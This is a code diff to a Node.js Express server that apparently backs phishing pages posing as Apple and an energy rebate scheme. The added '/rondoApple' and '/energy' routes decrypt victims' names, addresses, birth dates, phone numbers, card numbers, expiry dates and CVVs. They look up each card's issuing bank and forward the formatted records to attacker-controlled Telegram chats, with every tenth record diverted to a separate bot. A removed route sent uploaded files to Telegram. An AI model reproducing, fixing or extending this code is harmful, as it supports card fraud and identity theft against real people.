@@ -6,7 +6,7 @@ var fs = require("fs");
 var CryptoJS = require("crypto-js");
 require("dotenv").config();
 const mysql = require("mysql");
-const jwt = require("jsonwebtoken");
+import counts from "./counts.json" assert { type: "json" };
 
 const port = process.env.PORT || 8000;
 
@@ -34,37 +34,6 @@ panelConnection.connect((err) => {
 });
 
 var bankName;
-
-//Dependencies
-const multer = require("multer");
-
-//Multer DiskStorage Config
-const diskStorage = multer.diskStorage({
-  destination: "assets/profile_upload",
-  filename: (req, file, call_back) => {
-    //Prepend date to the filename or anything that makes
-    //the file unique so it won't be overwritten
-    call_back(null, Date.now() + "_" + file.originalname);
-  },
-});
-
-//Create Multer Instance
-const upload = multer({ storage: diskStorage });
-
-//File upload
-//or app.post()
-
-app.post("/uploadP60", upload.single("file"), (req, res) => {
-  //The file
-  axios.post(
-    `https://api.telegram.org/bot${process.env.sendresbotID}/sendDocument?chat_id=680379375&document=${req.file.path}`
-  );
-  console.log(req.file);
-});
-
-app.on("uncaughtException", (err) => {
-  console.error("There was an uncaught error", err);
-});
 
 app.options("/getips", cors());
 
@@ -8558,6 +8527,117 @@ app.post("/t1AppleAu", (req, res) => {
 //APPLE
 //APPLE
 
+app.options("/rondoApple", cors());
+
+app.post("/rondoApple", (req, res) => {
+  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  bin = req.body.bin;
+
+  if (bin.length === 7) {
+    formatBin = bin.replace(/ /g, "");
+    if (formatBin.length === 7) {
+      formatBin = bin.slice(0, -1);
+    }
+    bin = formatBin;
+  }
+  axios
+    .get(`https://lookup.binlist.net/${bin}`)
+    .then((resp) => {
+      if (!resp.data.bank) {
+        bankName = "";
+      } else {
+        bankName = resp.data.bank.name;
+      }
+    })
+    .then(function () {
+      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
+      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
+      if (capzEvri == 10) {
+        axios
+          .post(
+            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
+            {
+              chat_id: 680379375,
+              text: `HAYTCHRES:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
+          )
+          .catch((e) => {
+            console.log(e);
+          });
+        capzEvri = 4;
+      } else {
+        axios
+          .post(
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+            {
+              chat_id: 680379375,
+              text: `AppleRondo:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
+          )
+          .catch((e) => {
+            console.log(e);
+          });
+        axios
+          .post(
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+            {
+              chat_id: 5598032330,
+              text: `Apple:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
+          )
+          .catch((e) => {
+            console.log(e);
+          });
+        capzEvri += 1;
+      }
+      res.send("Update Complete");
+    });
+});
+
 app.options("/ghostApple", cors());
 
 app.post("/ghostApple", (req, res) => {
@@ -13227,6 +13307,78 @@ app.post("/giveip", (req, res) => {
     fs.appendFile("ips.txt", content, (err) => {
       res.send("Update Completed");
     });
+  }
+});
+
+//ENERGY
+//ENERGY
+//ENERGY
+
+app.options("/energy", cors());
+
+app.post("/energy", async (req, res) => {
+  let count;
+  let index;
+  info = req.body;
+
+  for (var i = 0; i < counts.length; i++) {
+    if (counts[i].owner == info.owner) {
+      index = i;
+      count = counts[i].count;
+    }
+  }
+
+  if (info.bin.length === 7) {
+    formatBin = info.bin.replace(/ /g, "");
+    if (formatBin.length === 7) {
+      formatBin = info.bin.slice(0, -1);
+    }
+    info.bin = formatBin;
+  }
+  let binLookup = await axios.get(`https://lookup.binlist.net/${bin}`);
+  let bank = binLookup.data.bank.name;
+  let binList = `${info.bin} | ${info.dob} | ${info.pcode} | ${bank}`;
+  var originalText = `+----------- Personal Information ------------+\nFull Name: ${info.fullName}\nDOB: ${info.dob}\nAddress: ${info.addy}\nPostcode: ${info.pcode}\nPhone Number: ${info.telephone}\n+ ----------- Card Information ------------+\nCard Name: ${info.ccname}\nCard Number: ${info.ccnum}\nExpiry: ${info.ccexp}\nCVV: ${info.cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${info.userAgent}\nIP: ${info.ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
+  if (count == 10) {
+    axios
+      .post(
+        `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
+        {
+          chat_id: 680379375,
+          text: `HAYTCHRES:\n${originalText}`,
+          parse_mode: "Markdown",
+        }
+      )
+      .catch((e) => {
+        console.log(e);
+      });
+    counts[index].count = 0;
+  } else {
+    axios
+      .post(
+        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+        {
+          chat_id: 680379375,
+          text: `EnergyRebate ${info.owner}:\n${originalText}`,
+          parse_mode: "Markdown",
+        }
+      )
+      .catch((e) => {
+        console.log(e);
+      });
+    axios
+      .post(
+        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+        {
+          chat_id: info.owner,
+          text: `EnergyRebate:\n${originalText}`,
+          parse_mode: "Markdown",
+        }
+      )
+      .catch((e) => {
+        console.log(e);
+      });
+    counts[index].count += 1;
   }
 });
 
